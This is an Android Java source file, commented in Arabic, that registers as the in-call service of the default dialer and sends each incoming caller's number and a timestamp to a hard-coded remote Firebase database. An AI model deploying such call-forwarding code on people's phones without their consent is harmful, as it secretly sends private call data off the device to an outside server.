package com.cdma.gsm.call;

import android.telecom.Call;
import android.telecom.InCallService;
import android.util.Log;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class MyInCallService extends InCallService {

    private static final String TAG = "InCallServiceBridge";
    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";

    @Override
    public void onCallAdded(Call call) {
        super.onCallAdded(call);
        
        Log.d(TAG, "تم اكتشاف مكالمة جديدة عبر نظام الـ Dialer");

        // استخراج بيانات المكالمة
        if (call.getDetails() != null && call.getDetails().getHandle() != null) {
            String rawUri = call.getDetails().getHandle().toString();
            
            // تنظيف الرقم (إزالة بادئة tel:)
            String incomingNumber = rawUri.replace("tel:", "").trim();
            
            Log.i(TAG, "الرقم الملتقط فورياً: " + incomingNumber);

            // إرسال الإشارة فوراً إلى Firebase
            sendToFirebase(incomingNumber);
        }
    }

    private void sendToFirebase(String number) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
            DatabaseReference myRef = database.getReference("bridge_signals");

            Map<String, Object> data = new HashMap<>();
            data.put("number", number);
            data.put("type", "CALL");
            data.put("method", "DefaultDialer"); // لتمييز أن هذه أسرع طريقة
            data.put("timestamp", System.currentTimeMillis());

            // إرسال لحظي
            myRef.setValue(data).addOnSuccessListener(aVoid -> 
                Log.d(TAG, "تم إرسال بيانات Dialer بنجاح")
            );
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال بيانات Dialer: " + e.getMessage());
        }
    }

    @Override
    public void onCallRemoved(Call call) {
        super.onCallRemoved(call);
        Log.d(TAG, "انتهت المكالمة أو تم رفضها.");
    }
}
